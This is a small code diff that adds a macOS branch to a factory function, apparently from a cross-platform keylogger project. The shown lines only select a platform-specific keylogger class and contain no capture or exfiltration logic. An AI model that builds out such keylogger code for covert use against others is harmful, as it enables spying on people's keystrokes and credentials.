@@ -8,6 +8,14 @@ IKeylogger* createPlatformKeylogger() {
     return new WindowsKeylogger();
 }
 
+#elif defined(__APPLE__)
+
+#include "keylogger_mac.hpp"
+
+IKeylogger* createPlatformKeylogger() {
+    return new MacKeylogger();
+}
+
 #else
 
 #include <iostream>
